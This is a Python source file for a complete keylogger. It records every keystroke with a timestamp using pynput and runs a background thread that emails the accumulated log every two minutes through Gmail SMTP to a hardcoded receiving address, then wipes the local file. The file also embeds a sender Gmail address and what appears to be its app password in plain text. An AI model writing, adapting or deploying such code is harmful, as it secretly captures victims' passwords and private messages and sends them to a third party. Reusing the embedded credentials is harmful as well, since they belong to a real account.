import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
import time
import os

# Variables for the keylogger
log_file = "keylogger.txt"  # File to store logs
email = "ishida0873@gmail.com"  # Sender email
password = "lams qamh iyvc cubf"  # Sender email password
send_to_email = "aizenbankai374@gmail.com"  # Receiver email
send_interval = 120  # Interval to send emails (in seconds)

# Function to send email
def send_email():
    try:
        with open(log_file, "r") as file:
            log_content = file.read()
        # Create email
        msg = MIMEMultipart()
        msg["From"] = email
        msg["To"] = send_to_email
        msg["Subject"] = "Keylogger Logs"
        msg.attach(MIMEText(log_content, "plain"))
        # Send email
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(email, password)
            server.send_message(msg)
        # Clear the log file after sending
        with open(log_file, "w") as file:
            file.write("")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Function to log keys with timestamp
def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key.char}\n")
    except AttributeError:  # For special keys like Shift, Ctrl, etc.
        with open(log_file, "a") as file:
            file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key}\n")

# Function to send email periodically
def periodic_email():
    while True:
        time.sleep(send_interval)
        send_email()

# Main function to start the keylogger
def main():
    # Start the email sending thread
    import threading
    email_thread = threading.Thread(target=periodic_email, daemon=True)
    email_thread.start()

    # Start the keylogger
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    # Ensure log file exists
    if not os.path.exists(log_file):
        with open(log_file, "w") as file:
            file.write("")
    main()